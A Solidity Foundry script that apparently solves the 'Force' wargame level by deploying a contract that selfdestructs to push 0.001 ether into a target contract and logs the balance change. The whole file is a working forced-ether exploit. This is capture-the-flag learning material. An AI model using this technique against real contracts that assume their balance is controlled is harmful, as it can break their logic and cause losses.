// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackContract {
    constructor(address _address) payable {
        selfdestruct(payable(_address));
    }
}

contract ForceSolution is Script {
    Force public force = Force(0x2196348B701c5F6f78b8EE4a9aB2a5d88c3C7176);

    function run() external {
        console.log("Contract Balance before: ", address(force).balance);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new AttackContract{value: 0.001 ether}(payable(address(force)));
        
        console.log("Contract Balance after: ", address(force).balance);

        vm.stopBroadcast();
    }
}